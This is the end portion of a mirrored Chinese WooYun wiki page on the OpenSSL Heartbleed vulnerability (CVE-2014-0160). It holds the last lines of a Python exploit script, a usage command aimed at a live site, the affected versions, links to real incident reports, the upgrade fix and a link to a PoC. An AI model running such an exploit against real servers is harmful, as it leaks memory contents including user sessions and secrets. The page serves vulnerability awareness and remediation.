    <span class="kw3">sys</span>.<span class="me1">stdout</span>.<span class="me1">flush</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
    s.<span class="me1">send</span><span class="br0">&#40;</span>hb<span class="br0">&#41;</span>
    hit_hb<span class="br0">&#40;</span>s<span class="br0">&#41;</span>
&nbsp;
<span class="kw1">if</span> __name__ <span class="sy0">==</span> <span class="st0">'__main__'</span>:
    main<span class="br0">&#40;</span><span class="br0">&#41;</span></pre>

<p>
使用方法
</p>
<pre class="code bash">py www.wooyun.org <span class="re5">--port</span>=<span class="nu0">443</span></pre>

<p>
网站若存在漏洞将返回服务器中的内存数据。
</p>

</div>

<h3 class="sectionedit5" id="影响范围">4、影响范围</h3>
<div class="level3">
<hr />

<p>
使用了以下版本的 OpenSSL的服务器。
</p>
<pre class="code">OpenSSL1.0.1、1.0.1a 、1.0.1b 、1.0.1c 、1.0.1d 、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等</pre>

</div>

<h3 class="sectionedit6" id="实际案例">5、实际案例</h3>
<div class="level3">
<hr />

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2010-055932" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-055932"  rel="nofollow">淘宝主站运维不当导致可以登录随机用户并且获取服务器敏感信息</a>
</p>

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2010-055941" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-055941"  rel="nofollow">微信网页版和公众账号版运维不当导致可随机登录微信用户并获取服务器敏感信息</a>
</p>

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2010-056253" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-056253"  rel="nofollow">京东某分站openssl漏洞导致敏感信息泄露及全站随机用户登录(证明可登录)</a>
</p>

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2010-055942" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-055942"  rel="nofollow">雅虎主站运维不当导致可以登录随机用户并且获取服务器敏感信息</a>
</p>

</div>

<h3 class="sectionedit7" id="漏洞修复">6、漏洞修复</h3>
<div class="level3">
<hr />

<p>
升级OpenSSL到版本1.0.1g及以上。
</p>

</div>

<h3 class="sectionedit8" id="相关资源">7、相关资源</h3>
<div class="level3">
<hr />

<p>
<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160" class="urlextern" title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160"  rel="nofollow">CVE-2014-0160</a>
</p>

<p>
<a href="https://gist.github.com/RixTox/10222402" class="urlextern" title="https://gist.github.com/RixTox/10222402"  rel="nofollow">openssl poc</a>
</p>

</div>

              <!-- wikipage stop -->

                            
            </div>
          </div>

        </article>

        
      </main>

      <footer id="dokuwiki__footer" class="small hidden-print">

        <a href="javascript:void(0)" class="back-to-top hidden-print btn btn-default btn-sm" title="跳至内容>" id="back-to-top"><i class="glyphicon glyphicon-chevron-up"></i></a>

                <div class="text-center">
          <p id="dw__license">
                      </p>
                  </div>
      </footer>

      
    </div><!-- /site -->

    <div class="no"><img src="http://wiki.wooyun.org/lib/exe/indexer.php?id=server%3Aopenssl&amp;1449197454" width="2" height="1" alt="" /></div>
    <div id="screen__mode" class="no">
      <span class="visible-xs"></span>
      <span class="visible-sm"></span>
      <span class="visible-md"></span>
      <span class="visible-lg"></span>
    </div>
  </div>
  <!--[if ( lte IE 7 | IE 8 ) ]></div><![endif]-->
</body>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "http://hm.baidu.com/hm.js?2e9369dace9479584f08203285c7cbce";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

<!-- Mirrored from wiki.wooyun.org/server:openssl by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 02:53:26 GMT -->
</html>
